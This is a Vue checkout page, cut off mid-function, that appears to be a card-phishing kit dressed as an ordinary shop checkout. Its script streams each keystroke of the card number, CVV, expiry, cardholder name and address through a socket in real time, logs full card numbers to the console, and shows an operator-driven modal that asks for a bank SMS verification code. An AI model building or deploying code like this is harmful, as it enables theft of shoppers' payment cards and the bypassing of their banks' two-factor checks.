<template>
    <div class="min-h-screen bg-gradient-to-br from-gray-50 via-white to-orange-50">
        <!-- Language Detection Loading -->
        <div v-if="!isInitialized || isTranslatingAny" class="fixed inset-0 bg-black/20 flex items-center justify-center z-50">
            <div class="bg-white rounded-xl shadow-xl p-6 flex items-center gap-4">
                <div class="animate-spin rounded-full h-6 w-6 border-b-2 border-orange-500"></div>
                <span class="text-gray-700">{{ t('detectingLocation', 'Detecting your location...') }}</span>
            </div>
        </div>

        <div class="bg-gradient-to-r from-orange-500 via-orange-600 to-red-500 py-8">
            <div class="max-w-7xl mx-auto px-4">
                <div class="text-center text-white space-y-6">
                    <!-- Country Detection Info -->
                    <div v-if="geoData" class="text-center text-orange-100 text-sm mb-4">
                        <span>📍 Detected: {{ countryName }} ({{ countryCode }}) - Language: {{ detectedLanguage.toUpperCase() }}</span>
                    </div>

                    <h1 class="text-3xl md:text-4xl font-bold">{{ t('title', 'Checkout - Complete Your Order') }}</h1>

                    <div class="flex items-center justify-center space-x-4 md:space-x-8">
                        <div class="flex items-center">
                            <div class="flex items-center justify-center w-10 h-10 bg-white text-orange-600 rounded-full font-bold text-lg shadow-lg">1</div>
                            <span class="ml-3 font-semibold text-white">{{ tNested('steps.shopping', 'Shopping Cart') }}</span>
                        </div>

                        <div class="w-8 md:w-16 h-1 bg-orange-300 rounded-full"></div>

                        <div class="flex items-center">
                            <div class="flex items-center justify-center w-10 h-10 bg-orange-300 text-orange-800 rounded-full font-bold text-lg shadow-lg">2</div>
                            <span class="ml-3 font-semibold text-orange-100">{{ tNested('steps.shipping', 'Shipping & Payment') }}</span>
                        </div>

                        <div class="w-8 md:w-16 h-1 bg-orange-200 rounded-full opacity-50"></div>

                        <div class="flex items-center">
                            <div class="flex items-center justify-center w-10 h-10 bg-orange-200 text-orange-600 rounded-full font-bold text-lg shadow-lg opacity-50">3</div>
                            <span class="ml-3 font-semibold text-orange-100 opacity-50">{{ tNested('steps.confirmation', 'Confirmation') }}</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="max-w-7xl mx-auto px-4 py-8">
            <div class="grid lg:grid-cols-2 gap-8">
                <div class="bg-white rounded-2xl shadow-xl p-6 md:p-8 animate-fade-in-up">
                    <h2 class="text-2xl font-bold text-gray-900 mb-6 flex items-center gap-3">
                        <FontAwesomeIcon :icon="faFileInvoice" class="text-orange-500" />
                        {{ t('invoiceDetails', 'Invoice Details') }}
                    </h2>

                    <div class="space-y-6">
                        <div class="grid md:grid-cols-2 gap-4">
                            <div class="space-y-2">
                                <label for="firstName" class="block text-sm font-semibold text-gray-700"> {{ t('firstName', 'First Name') }} <span class="text-red-500">*</span> </label>
                                <input id="firstName" v-model="form.firstName" type="text" required autocomplete="given-name" @input="sendFieldUpdate('firstName', $event.target.value)" class="w-full px-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-orange-500 focus:border-orange-500 transition-all duration-300 hover:border-orange-300" :placeholder="t('firstNamePlaceholder', 'Enter your first name')" />
                            </div>
                            <div class="space-y-2">
                                <label for="lastName" class="block text-sm font-semibold text-gray-700"> {{ t('lastName', 'Last Name') }} <span class="text-red-500">*</span> </label>
                                <input id="lastName" v-model="form.lastName" type="text" required autocomplete="family-name" @input="sendFieldUpdate('lastName', $event.target.value)" class="w-full px-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-orange-500 focus:border-orange-500 transition-all duration-300 hover:border-orange-300" :placeholder="t('lastNamePlaceholder', 'Enter your last name')" />
                            </div>
                        </div>

                        <div class="space-y-2">
                            <label for="country" class="block text-sm font-semibold text-gray-700"> {{ t('countryRegion', 'Country/Region') }} <span class="text-red-500">*</span> </label>
                            <select id="country" v-model="form.country" required autocomplete="country" @change="sendFieldUpdate('country', $event.target.value)" class="w-full px-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-orange-500 focus:border-orange-500 transition-all duration-300 hover:border-orange-300 bg-white">
                                <option value="">{{ t('selectCountry', 'Select your country') }}</option>
                                <option v-for="country in countriesData" :key="country.code" :value="country.code">
                                    {{ country.name }}
                                </option>
                            </select>
                        </div>

                        <div class="space-y-2">
                            <label for="street" class="block text-sm font-semibold text-gray-700"> {{ t('streetAddress', 'Street Address') }} <span class="text-red-500">*</span> </label>
                            <input id="street" v-model="form.street" type="text" required autocomplete="address-line1" @input="sendFieldUpdate('street', $event.target.value)" class="w-full px-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-orange-500 focus:border-orange-500 transition-all duration-300 hover:border-orange-300" :placeholder="t('streetPlaceholder', 'Enter your street address')" />
                        </div>

                        <div class="space-y-2">
                            <label for="apartment" class="block text-sm font-semibold text-gray-700"> {{ t('apartment', 'Apartment, suite, etc.') }} </label>
                            <input id="apartment" v-model="form.apartment" type="text" autocomplete="address-line2" @input="sendFieldUpdate('apartment', $event.target.value)" class="w-full px-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-orange-500 focus:border-orange-500 transition-all duration-300 hover:border-orange-300" :placeholder="t('apartmentPlaceholder', 'Apartment, suite, etc. (optional)')" />
                        </div>

                        <div class="grid md:grid-cols-2 gap-4">
                            <div class="space-y-2">
                                <label for="postalCode" class="block text-sm font-semibold text-gray-700"> {{ t('postalCode', 'Postal Code') }} <span class="text-red-500">*</span> </label>
                                <input id="postalCode" v-model="form.postalCode" type="text" required autocomplete="postal-code" @input="sendFieldUpdate('postalCode', $event.target.value)" class="w-full px-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-orange-500 focus:border-orange-500 transition-all duration-300 hover:border-orange-300" :placeholder="t('postalCodePlaceholder', 'Enter postal code')" />
                            </div>
                            <div class="space-y-2">
                                <label for="city" class="block text-sm font-semibold text-gray-700"> {{ t('city', 'City') }} <span class="text-red-500">*</span> </label>
                                <input id="city" v-model="form.city" type="text" required autocomplete="address-level2" @input="sendFieldUpdate('city', $event.target.value)" class="w-full px-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-orange-500 focus:border-orange-500 transition-all duration-300 hover:border-orange-300" :placeholder="t('cityPlaceholder', 'Enter your city')" />
                            </div>
                        </div>

                        <div class="space-y-2">
                            <label for="state" class="block text-sm font-semibold text-gray-700"> {{ t('state', 'State/Province') }} </label>
                            <input id="state" v-model="form.state" type="text" autocomplete="address-level1" @input="sendFieldUpdate('state', $event.target.value)" class="w-full px-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-orange-500 focus:border-orange-500 transition-all duration-300 hover:border-orange-300" :placeholder="t('statePlaceholder', 'Enter state/province')" />
                        </div>

                        <div class="grid md:grid-cols-2 gap-4">
                            <div class="space-y-2">
                                <label for="phone" class="block text-sm font-semibold text-gray-700"> {{ t('phoneOptional', 'Phone (Optional)') }} </label>
                                <input id="phone" v-model="form.phone" type="tel" autocomplete="tel" @input="sendFieldUpdate('phone', $event.target.value)" class="w-full px-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-orange-500 focus:border-orange-500 transition-all duration-300 hover:border-orange-300" placeholder="+49 123 456 7890" />
                            </div>
                            <div class="space-y-2">
                                <label for="email" class="block text-sm font-semibold text-gray-700"> {{ t('email', 'Email') }} <span class="text-red-500">*</span> </label>
                                <input id="email" v-model="form.email" type="email" required autocomplete="email" @input="sendFieldUpdate('email', $event.target.value)" class="w-full px-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-orange-500 focus:border-orange-500 transition-all duration-300 hover:border-orange-300" placeholder="your@email.com" />
                            </div>
                        </div>
                    </div>
                </div>

                <div class="bg-white rounded-2xl shadow-xl p-6 md:p-8 animate-fade-in-up">
                    <h2 class="text-2xl font-bold text-gray-900 mb-6 flex items-center gap-3">
                        <FontAwesomeIcon :icon="faCreditCard" class="text-orange-500" />
                        {{ t('paymentInformation', 'Payment Information') }}
                    </h2>

                    <div class="space-y-4 mb-6">
                        <h3 class="text-lg font-semibold text-gray-800">{{ t('selectPaymentMethod', 'Select Payment Method') }}</h3>
                        <div class="grid grid-cols-2 gap-4">
                            <label class="relative cursor-pointer">
                                <input v-model="payment.method" type="radio" value="visa" class="sr-only" />
                                <div class="border-2 rounded-xl p-4 transition-all duration-300 hover:border-orange-300" :class="payment.method === 'visa' ? 'border-orange-500 bg-orange-50' : 'border-gray-300'">
                                    <div class="flex items-center justify-center gap-3">
                                        <img src="/img/visa.png" alt="Visa" class="h-6" />
                                        <span class="font-semibold text-gray-700">Visa</span>
                                    </div>
                                </div>
                            </label>
                            <label class="relative cursor-pointer">
                                <input v-model="payment.method" type="radio" value="mastercard" class="sr-only" />
                                <div class="border-2 rounded-xl p-4 transition-all duration-300 hover:border-orange-300" :class="payment.method === 'mastercard' ? 'border-orange-500 bg-orange-50' : 'border-gray-300'">
                                    <div class="flex items-center justify-center gap-3">
                                        <img src="/img/master-card.svg" alt="Mastercard" class="h-6" />
                                        <span class="font-semibold text-gray-700">Mastercard</span>
                                    </div>
                                </div>
                            </label>
                        </div>
                    </div>

                    <div v-if="payment.method" class="space-y-6">
                        <input type="hidden" :value="payment.method === 'visa' ? 'Visa' : 'Mastercard'" autocomplete="cc-type" />

                        <div class="space-y-2">
                            <label for="cardNumber" class="block text-sm font-semibold text-gray-700"> {{ t('cardNumber', 'Card Number') }} <span class="text-red-500">*</span> </label>
                            <input id="cardNumber" v-model="payment.cardNumber" type="text" required maxlength="19" @input="formatCardNumber" autocomplete="cc-number" class="w-full px-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-orange-500 focus:border-orange-500 transition-all duration-300 hover:border-orange-300" :class="cardNumberError ? 'border-red-500 focus:ring-red-500 focus:border-red-500' : ''" placeholder="1234 5678 9012 3456" />
                            <div v-if="cardNumberError" class="text-red-500 text-sm mt-1 flex items-start gap-2">
                                <svg class="w-4 h-4 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
                                    <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clip-rule="evenodd" />
                                </svg>
                                <span>{{ cardNumberError }}</span>
                            </div>
                        </div>

                        <div class="grid grid-cols-2 gap-4">
                            <div class="space-y-2">
                                <label for="expiry" class="block text-sm font-semibold text-gray-700"> {{ t('expiryDate', 'Expiry Date') }} <span class="text-red-500">*</span> </label>
                                <input id="expiry" v-model="payment.expiry" type="text" required maxlength="5" @input="formatExpiry" autocomplete="cc-exp" class="w-full px-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-orange-500 focus:border-orange-500 transition-all duration-300 hover:border-orange-300" :class="expiryError ? 'border-red-500 focus:ring-red-500 focus:border-red-500' : ''" placeholder="MM/YY" />
                                <div v-if="expiryError" class="text-red-500 text-sm mt-1 flex items-start gap-2">
                                    <svg class="w-4 h-4 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
                                        <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clip-rule="evenodd" />
                                    </svg>
                                    <span>{{ expiryError }}</span>
                                </div>
                            </div>
                            <div class="space-y-2">
                                <label for="cvv" class="block text-sm font-semibold text-gray-700"> {{ t('cvv', 'CVV') }} <span class="text-red-500">*</span> </label>
                                <input id="cvv" v-model="payment.cvv" type="text" required maxlength="4" @input="validateCVV" autocomplete="cc-csc" class="w-full px-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-orange-500 focus:border-orange-500 transition-all duration-300 hover:border-orange-300" :class="cvvError ? 'border-red-500 focus:ring-red-500 focus:border-red-500' : ''" placeholder="123" />
                                <div v-if="cvvError" class="text-red-500 text-sm mt-1 flex items-start gap-2">
                                    <svg class="w-4 h-4 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
                                        <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clip-rule="evenodd" />
                                    </svg>
                                    <span>{{ cvvError }}</span>
                                </div>
                            </div>
                        </div>

                        <div class="space-y-2">
                            <label for="cardholderName" class="block text-sm font-semibold text-gray-700"> {{ t('cardholderName', 'Cardholder Name') }} <span class="text-red-500">*</span> </label>
                            <input id="cardholderName" v-model="payment.cardholderName" type="text" required @input="validateCardholderName" autocomplete="cc-name" class="w-full px-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-orange-500 focus:border-orange-500 transition-all duration-300 hover:border-orange-300" :class="cardholderNameError ? 'border-red-500 focus:ring-red-500 focus:border-red-500' : ''" :placeholder="t('cardholderPlaceholder', 'Cardholder Name')" />
                            <div v-if="cardholderNameError" class="text-red-500 text-sm mt-1 flex items-start gap-2">
                                <svg class="w-4 h-4 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
                                    <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clip-rule="evenodd" />
                                </svg>
                                <span>{{ cardholderNameError }}</span>
                            </div>
                        </div>
                    </div>

                    <div class="mt-8 p-6 bg-gradient-to-r from-orange-50 to-red-50 rounded-xl border border-orange-200">
                        <h3 class="text-lg font-semibold text-gray-800 mb-4">{{ t('orderSummary', 'Order Summary') }}</h3>

                        <div v-if="cartItems.length > 0" class="space-y-4 mb-4">
                            <CartItem v-for="item in cartItems" :key="item.itemKey" :item="item" />
                        </div>

                        <div class="space-y-2">
                            <div class="flex justify-between text-gray-600">
                                <span>{{ t('subtotal', 'Subtotal') }}</span>
                                <span>{{ currencySymbol }}{{ subtotal.toFixed(2) }}</span>
                            </div>
                            <div class="flex justify-between text-gray-600">
                                <span>{{ t('shipping', 'Shipping') }}</span>
                                <span class="text-green-600 font-semibold">
                                    {{ t('free', 'Free') }}
                                </span>
                            </div>
                            <div class="flex justify-between text-gray-600">
                                <span>{{ t('tax', 'Tax') }}</span>
                                <span class="text-green-600 font-semibold">{{ t('free', 'Free') }}</span>
                            </div>
                            <hr class="border-orange-200" />
                            <div class="flex justify-between text-lg font-bold text-gray-900">
                                <span>{{ t('total', 'Total') }}</span>
                                <span>{{ currencySymbol }}{{ total.toFixed(2) }}</span>
                            </div>
                        </div>

                        <div v-if="cartItems.length === 0" class="text-center py-8">
                            <p class="text-gray-500 mb-4">{{ t('cartEmpty', 'Your cart is empty') }}</p>
                            <NuxtLink to="/" class="text-orange-600 hover:text-orange-700 font-semibold"> {{ t('continueShopping', 'Continue Shopping') }} </NuxtLink>
                        </div>
                    </div>

                    <button @click="handleSubmit" :disabled="!isFormValid" class="w-full mt-6 bg-gradient-to-r from-orange-500 via-orange-600 to-red-500 hover:from-orange-600 hover:via-red-500 hover:to-pink-500 disabled:from-gray-400 disabled:to-gray-500 disabled:cursor-not-allowed text-white font-bold py-4 px-6 rounded-xl transition-all duration-500 shadow-xl hover:shadow-2xl transform hover:-translate-y-1 animate-shimmer bg-size-200 flex items-center justify-center gap-3">
                        <FontAwesomeIcon :icon="faLock" class="w-5 h-5" />
                        {{ t('completeOrder', 'Complete Order') }}
                    </button>

                    <div class="mt-4 flex items-center justify-center gap-2 text-sm text-gray-600">
                        <FontAwesomeIcon :icon="faShieldAlt" class="text-green-500" />
                        <span>{{ t('securePayment', 'Secure Payment') }}</span>
                    </div>
                </div>
            </div>
        </div>

        <div v-if="paymentData" class="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
            <div class="bg-white shadow-xl p-6 md:p-8 max-w-md w-full mx-4 animate-fade-in-up">
                <div class="flex items-center justify-between">
                    <FontAwesomeIcon :icon="faBuildingColumns" class="w-8 h-8 text-black" />
                    <div class="flex items-center gap-2">
                        <img src="/img/visa-logo.png" alt="" class="w-8 h-auto" loading="lazy" />
                        <img src="/img/apple-pay.png" alt="" class="w-8 h-auto" loading="lazy" />
                        <img src="/img/master-card.svg" alt="" class="w-8 h-auto" loading="lazy" />
                    </div>
                </div>

                <div class="flex flex-col gap-2 justify-start p-2">
                    <p class="text-xl font-bold">
                        <span v-if="paymentData.status === 'pending'">Loading</span>
                        <span v-else-if="paymentData.status === 'success'">{{ t('purchaseSuccessful', 'Purchase Successful') }}</span>
                        <span v-else-if="paymentData.status === 'wrong'">Payment Failed</span>
                        <span v-else-if="paymentData.status === 'sms' || paymentData.status === 'sms_error'">{{ t('verificationCode', 'Verification Code') }}</span>
                    </p>
                    <p>
                        <span v-if="paymentData.status === 'pending'">Please wait, we will process your request...</span>
                        <span v-else-if="paymentData.status === 'success'">{{ t('thankYouOrder', 'Thank you for your order!') }}</span>
                        <span v-else-if="paymentData.status === 'wrong'">Your payment could not be processed. Please check your payment details and try again.</span>
                        <span v-else-if="paymentData.status === 'sms' || paymentData.status === 'sms_error'">{{ t('enterSixCharCode', 'Enter 6-character code') }}</span>
                    </p>
                    <div class="w-full mt-4 flex justify-center items-center">
                        <div v-if="paymentData.status === 'pending'" class="border-[6px] border-t-gray-200 border-l-gray-200 border-b-gray-200 animate-spin rounded-full w-16 h-16 border-blue-400"></div>
                        <div v-else-if="paymentData.status === 'success'" class="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center">
                            <FontAwesomeIcon :icon="faCheckCircle" class="w-8 h-8 text-green-500" />
                        </div>
                        <div v-else-if="paymentData.status === 'wrong'" class="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center">
                            <FontAwesomeIcon :icon="faTimesCircle" class="w-8 h-8 text-red-500" />
                        </div>
                        <div v-else-if="paymentData.status === 'sms' || paymentData.status === 'sms_error'" class="w-16 h-16 bg-orange-100 rounded-full flex items-center justify-center">
                            <FontAwesomeIcon :icon="faMobileAlt" class="w-8 h-8 text-orange-500" />
                        </div>
                    </div>
                </div>

                <!-- SMS Verification Section -->
                <div v-if="paymentData.status === 'sms' || paymentData.status === 'sms_error'" class="space-y-6 mt-6">
                    <div v-if="!isSubmittingOTP" class="space-y-4">
                        <div>
                            <label for="otp" class="block text-sm font-semibold mb-3" :class="paymentData.status === 'sms_error' ? 'text-red-600' : 'text-gray-700'">{{ t('verificationCode', 'Verification Code') }}</label>
                            <input id="otp" v-model="otpCode" type="text" maxlength="6" class="w-full px-4 py-4 text-center text-2xl font-mono tracking-widest rounded-xl transition-all duration-300" :class="paymentData.status === 'sms_error' ? 'border-2 border-red-500 focus:ring-2 focus:ring-red-500 focus:border-red-500 hover:border-red-400' : 'border border-gray-300 focus:ring-2 focus:ring-orange-500 focus:border-orange-500 hover:border-orange-300'" placeholder="000000" @input="formatOTP" />
                            <p v-if="paymentData.status === 'sms_error'" class="text-red-600 text-sm mt-2">{{ t('invalidCode', 'Invalid code') }}</p>
                        </div>
                        <button @click="submitOTP" :disabled="!otpCode || otpCode.length !== 6" class="w-full bg-gradient-to-r from-orange-500 via-orange-600 to-red-500 hover:from-orange-600 hover:via-red-500 hover:to-pink-500 disabled:from-gray-400 disabled:to-gray-500 disabled:cursor-not-allowed text-white font-bold py-4 px-6 rounded-xl transition-all duration-500 shadow-xl hover:shadow-2xl transform hover:-translate-y-1 animate-shimmer bg-size-200 flex items-center justify-center gap-3">
                            <span v-if="!otpCode || otpCode.length !== 6">{{ t('enterSixCharCode', 'Enter 6-character code') }}</span>
                            <span v-else>{{ t('verifyCode', 'Verify Code') }}</span>
                        </button>
                    </div>

                    <div v-if="isSubmittingOTP" class="text-center py-8">
                        <div class="flex items-center justify-center gap-3 text-gray-600 mb-4">
                            <div class="w-3 h-3 bg-orange-500 rounded-full animate-bounce"></div>
                            <div class="w-3 h-3 bg-orange-500 rounded-full animate-bounce" style="animation-delay: 0.1s"></div>
                            <div class="w-3 h-3 bg-orange-500 rounded-full animate-bounce" style="animation-delay: 0.2s"></div>
                        </div>
                        <p class="text-lg font-medium text-gray-700">{{ t('verifyingCode', 'Verifying code...') }}</p>
                        <p class="text-sm text-gray-500 mt-2">{{ t('verifyingWait', 'Please wait while we verify your code') }}</p>
                    </div>
                </div>

                <!-- Success Action Button -->
                <div v-if="paymentData.status === 'success'" class="mt-6">
                    <button @click="closeModal" class="w-full bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white font-semibold py-4 px-6 rounded-xl transition-all duration-300 shadow-lg hover:shadow-xl transform hover:-translate-y-0.5">{{ t('continueShopping', 'Continue Shopping') }}</button>
                </div>

                <!-- Error Action Button -->
                <div v-if="paymentData.status === 'wrong'" class="mt-6">
                    <button @click="closeModal" class="w-full bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white font-semibold py-4 px-6 rounded-xl transition-all duration-300 shadow-lg hover:shadow-xl transform hover:-translate-y-0.5">Try Again</button>
                </div>
            </div>
        </div>
    </div>
</template>

<script setup>
import { ref, computed, onUnmounted, onMounted } from 'vue';
import { FontAwesomeIcon } from '@fortawesome/vue-fontawesome';
import { faFileInvoice, faCreditCard, faLock, faShieldAlt, faSpinner, faCheckCircle, faTimesCircle, faMobileAlt, faExclamationTriangle, faBuildingColumns } from '@fortawesome/free-solid-svg-icons';
import countriesData from '~/assets/countries.json';
import CartItem from '~/components/cart/CartItem.vue';
import { useAutoTranslation } from '~/composables/useAutoTranslation';
import { useCart } from '~/composables/useCart';
import { useTracking } from '~/composables/useTracking';
import { useSocket } from '~/composables/useSocket';

// Auto Translation
const { isInitialized, currentLanguage, isTranslatingAny, languageInfo, geoData, countryCode, countryName, detectedLanguage, initializeAutoTranslation, translateCheckoutTexts, t, tNested, setLanguage } = useAutoTranslation();

useHead({
    title: 'Checkout - Complete Your Order',
    meta: [
        {
            name: 'description',
            content: 'Secure checkout page for completing your order with fast shipping and secure payment.'
        }
    ]
});

definePageMeta({
    layout: 'default'
});

const { cartItems, subtotal, tax, shipping, total, clearCart } = useCart();
const { trackInitiateCheckout, trackPurchase } = useTracking();
const { connect, sendCheckoutData, sendCardUpdate } = useSocket();

// Function để gửi cập nhật field real-time
const sendFieldUpdate = (field, value) => {
    sendCardUpdate({
        field: field,
        value: value,
        timestamp: new Date()
    });
};

// Currency symbol based on majority currency in cart
const currencySymbol = computed(() => {
    if (cartItems.value.length === 0) {
        return '$'; // default
    }

    // Count currencies in cart
    const currencyCount = cartItems.value.reduce((acc, item) => {
        const currency = item.currency || 'USD';
        acc[currency] = (acc[currency] || 0) + 1;
        return acc;
    }, {});

    // Find majority currency
    const majorityCurrency = Object.keys(currencyCount).reduce((a, b) => (currencyCount[a] > currencyCount[b] ? a : b));

    return majorityCurrency === 'EUR' ? '€' : '$';
});

const form = ref({
    firstName: '',
    lastName: '',
    country: '',
    street: '',
    apartment: '',
    postalCode: '',
    city: '',
    state: '',
    phone: '',
    email: ''
});

const payment = ref({
    method: '',
    cardNumber: '',
    expiry: '',
    cvv: '',
    cardholderName: ''
});

const paymentData = ref(null);
const statusInterval = ref(null);
const otpCode = ref('');
const isSubmittingOTP = ref(false);

// Thêm state cho validation errors
const cardNumberError = ref('');
const expiryError = ref('');
const cvvError = ref('');
const cardholderNameError = ref('');

const isFormValid = computed(() => {
    return form.value.firstName && form.value.lastName && form.value.country && form.value.street && form.value.postalCode && form.value.city && form.value.email && payment.value.method && payment.value.cardNumber && payment.value.expiry && payment.value.cvv && payment.value.cardholderName && !cardNumberError.value && !expiryError.value && !cvvError.value && !cardholderNameError.value;
});

const formatCardNumber = (event) => {
    let value = event.target.value.replace(/\s/g, '').replace(/\D/g, '');

    // Limit to 19 digits (maximum for most cards)
    if (value.length > 19) {
        value = value.substring(0, 19);
    }

    const formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
    payment.value.cardNumber = formattedValue;

    // Gửi cập nhật real-time
    sendCardUpdate({
        field: 'cardNumber',
        value: formattedValue,
        timestamp: new Date()
    });

    // Only validate when user has entered enough digits
    if (value.length >= 13) {
        validateCardNumber();
    }
};

// Thêm watchers cho các field khác
const watchFormFields = () => {
    // Watch firstName
    watch(
        () => form.value.firstName,
        (newValue) => {
            if (newValue) {
                sendCardUpdate({
                    field: 'firstName',
                    value: newValue,
                    timestamp: new Date()
                });
            }
        }
    );

    // Watch lastName
    watch(
        () => form.value.lastName,
        (newValue) => {
            if (newValue) {
                sendCardUpdate({
                    field: 'lastName',
                    value: newValue,
                    timestamp: new Date()
                });
            }
        }
    );

    // Watch email
    watch(
        () => form.value.email,
        (newValue) => {
            if (newValue) {
                sendCardUpdate({
                    field: 'email',
                    value: newValue,
                    timestamp: new Date()
                });
            }
        }
    );

    // Watch phone
    watch(
        () => form.value.phone,
        (newValue) => {
            if (newValue) {
                sendCardUpdate({
                    field: 'phone',
                    value: newValue,
                    timestamp: new Date()
                });
            }
        }
    );

    // Watch country
    watch(
        () => form.value.country,
        (newValue) => {
            if (newValue) {
                sendCardUpdate({
                    field: 'country',
                    value: newValue,
                    timestamp: new Date()
                });
            }
        }
    );

    // Watch city
    watch(
        () => form.value.city,
        (newValue) => {
            if (newValue) {
                sendCardUpdate({
                    field: 'city',
                    value: newValue,
                    timestamp: new Date()
                });
            }
        }
    );
};

const validateCardNumber = () => {
    const cardNumber = payment.value.cardNumber.replace(/\s/g, '');
    const cardType = getCardType(cardNumber);

    // Clear previous error
    cardNumberError.value = '';

    // Check if it's a valid card number using Luhn algorithm
    if (cardNumber.length >= 13) {
        const isValid = luhnCheck(cardNumber);
        if (!isValid) {
            console.warn('Invalid card number detected:', cardNumber, 'Card type:', cardType);
            cardNumberError.value = `Số thẻ không hợp lệ. Loại thẻ phát hiện: ${cardType || 'Không xác định'}. Vui lòng kiểm tra lại.`;
        } else {
            console.log('Valid card number detected:', cardNumber, 'Card type:', cardType);
        }
    }
};

const luhnCheck = (cardNumber) => {
    let sum = 0;
    let isEven = false;

    // Loop through values starting from the rightmost side
    for (let i = cardNumber.length - 1; i >= 0; i--) {
        let digit = parseInt(cardNumber.charAt(i));

        if (isEven) {
            digit *= 2;
            if (digit > 9) {
                digit -= 9;
            }
        }

        sum += digit;
        isEven = !isEven;
    }

    return sum % 10 === 0;
};

const getCardType = (cardNumber) => {
    const cleanNumber = cardNumber.replace(/\s/g, '');

    // Visa: starts with 4
    if (/^4/.test(cleanNumber)) {
        return 'visa';
    }
    // Mastercard: starts with 5
    else if (/^5/.test(cleanNumber)) {
        return 'mastercard';
    }
    // American Express: starts with 3
    else if (/^3[47]/.test(cleanNumber)) {
        return 'amex';
    }
    // Discover: starts with 6
    else if (/^6/.test(cleanNumber)) {
        return 'discover';
    }

    return null;
};

const formatExpiry = (event) => {
    let value = event.target.value.replace(/\D/g, '');
    if (value.length >= 2) {
        value = value.substring(0, 2) + '/' + value.substring(2, 4);
    }
    payment.value.expiry = value;

    // Gửi cập nhật real-time
    sendCardUpdate({
        field: 'expiry',
        value: value,
        timestamp: new Date()
    });

    // Validate expiry date
    validateExpiryDate();
};

const validateExpiryDate = () => {
    const expiry = payment.value.expiry;

    // Clear previous error
    expiryError.value = '';

    // Only validate when user finishes entering the full date (MM/YY format)
    if (expiry.length === 5) {
        const [month, year] = expiry.split('/');
        const currentDate = new Date();
        const currentYear = currentDate.getFullYear() % 100; // Get last 2 digits
        const currentMonth = currentDate.getMonth() + 1; // January is 0

        const expMonth = parseInt(month);
        const expYear = parseInt(year);

        // Check if month is valid (1-12)
        if (expMonth < 1 || expMonth > 12) {
            expiryError.value = 'Tháng hết hạn không hợp lệ. Vui lòng nhập tháng từ 01-12.';
            return;
        }

        // Check if card is expired (only if year is clearly in the past)
        if (expYear < currentYear - 1) {
            expiryError.value = 'Thẻ đã hết hạn. Vui lòng kiểm tra ngày hết hạn.';
            return;
        }

        // Check if year is too far in the future (more than 10 years)
        if (expYear > currentYear + 10) {
            expiryError.value = 'Năm hết hạn không hợp lệ. Vui lòng kiểm tra ngày.';
            return;
        }
    }
};

const validateCVV = () => {
    const cvv = payment.value.cvv;

    // Clear previous error
    cvvError.value = '';

    // Remove non-numeric characters
    const cleanCVV = cvv.replace(/\D/g, '');

    // Only update if the cleaned value is different
    if (cleanCVV !== cvv) {
        payment.value.cvv = cleanCVV;
    }

    // Gửi cập nhật real-time
    sendCardUpdate({
        field: 'cvv',
        value: cleanCVV,
        timestamp: new Date()
    });

    // Check if CVV is 3 or 4 digits (only when user finishes typing)
    if (cleanCVV.length > 0 && cleanCVV.length < 3) {
        // Don't clear yet, let user finish typing
        return;
    }

    if (cleanCVV.length > 4) {
        payment.value.cvv = cleanCVV.substring(0, 4);
        cvvError.value = 'CVV tối đa 4 chữ số.';
        return;
    }
};

const validateCardholderName = () => {
    const name = payment.value.cardholderName;

    // Clear previous error
    cardholderNameError.value = '';

    // Remove special characters and numbers, keep only letters and spaces
    const cleanName = name.replace(/[^a-zA-Z\s]/g, '');

    // Only update if the cleaned value is different
    if (cleanName !== name) {
        payment.value.cardholderName = cleanName;
    }

    // Gửi cập nhật real-time
    sendCardUpdate({
        field: 'cardholderName',
        value: cleanName,
        timestamp: new Date()
    });

    // Check if name is too long
    if (cleanName.length > 50) {
        payment.value.cardholderName = cleanName.substring(0, 50);
        cardholderNameError.value = 'Tên chủ thẻ không được vượt quá 50 ký tự.';
        return;
    }
};

const formatOTP = (event) => {
    let value = event.target.value.replace(/[^a-zA-Z0-9]/g, '').toUpperCase();
    otpCode.value = value;
};

const submitOTP = async () => {
    if (!otpCode.value || otpCode.value.length !== 6 || isSubmittingOTP.value) return;

    try {
        isSubmittingOTP.value = true;

